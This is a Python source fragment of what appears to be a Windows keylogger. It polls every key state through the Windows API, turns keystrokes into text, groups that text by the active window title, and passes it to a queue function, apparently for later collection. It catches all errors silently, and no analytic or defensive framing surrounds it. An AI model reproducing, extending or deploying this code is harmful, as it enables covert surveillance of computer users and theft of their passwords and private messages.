VK = {8: "[BS]", 9: "[TAB]", 13: "[ENTER]", 16: "[SHIFT]", 17: "[CTRL]", 18: "[ALT]",
      19: "[PAUSE]", 20: "[CAPS]", 27: "[ESC]", 32: " ", 33: "[PGUP]", 34: "[PGDN]",
      35: "[END]", 36: "[HOME]", 37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
      45: "[INS]", 46: "[DEL]", 91: "[WIN]", 160: "[LSHIFT]", 161: "[RSHIFT]",
      162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 165: "[RALT]"}


def f_keybuf():
    global g_keys
    if not g_keys:
        return ""
    out = "".join(g_keys)
    g_keys = []
    return out


def f_keys():
    u = ctypes.windll.user32
    down = {}
    last = ""
    acc = ""
    while G.get("run"):
        try:
            for vk in range(8, 256):
                st = u.GetAsyncKeyState(vk) & 0x8000
                if st and not down.get(vk):
                    down[vk] = True
                    ch = VK.get(vk)
                    if ch is None:
                        ch = chr(u.MapVirtualKeyW(vk, 2) or vk).lower()
                    acc += ch
                elif not st and down.get(vk):
                    down[vk] = False
            w = f_win()
            if w != last or len(acc) > 200:
                if acc:
                    f_queue({"t": "keys", "win": last}, acc.encode("utf-8", "replace"))
                    acc = ""
                last = w
        except Exception:
            pass
        time.sleep(0.04)
